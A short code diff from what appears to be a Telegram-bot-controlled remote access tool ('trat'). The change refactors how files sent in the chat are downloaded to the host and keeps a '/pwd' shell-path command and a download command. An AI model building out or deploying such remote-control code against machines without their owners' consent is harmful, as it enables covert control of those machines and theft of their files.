@@ -27,22 +27,11 @@ namespace trat
                 if (update.update_type == TELEBOT_UPDATE_TYPE_MESSAGE)
                 {
                     const auto& message = update.message;
+                    this -> handleDocuments(message.document);
                     if (message.text)
                     {
-                        if (message.document)
-                        {
-                            const auto& document = message.document;
-                            auto fileId = document->file_id;
-                            auto fileName = document->file_name;
-                            std::thread([this, fileId, fileName]() {
-                                this->downloadFromChat(fileId, fileName);
-                            }).detach();
-                        }
-                        else
-                        {
-                            this -> handleTextBasedCommand(message.text, "/pwd", (this -> shell).getCurrentPath());
+						    this -> handleTextBasedCommand(message.text, "/pwd", (this -> shell).getCurrentPath());
                             this -> handleDownloadCommand(message.text);
-                        }
                     }
                 }
                 // Update the offset to the latest update ID
@@ -50,7 +39,7 @@ namespace trat
             }
 
             // Release the memory allocated for updates
-            telebot_put_updates(updates, count); // Now `updates` and `count` are in scope
+            telebot_put_updates(updates, count);
         }
     }
 }
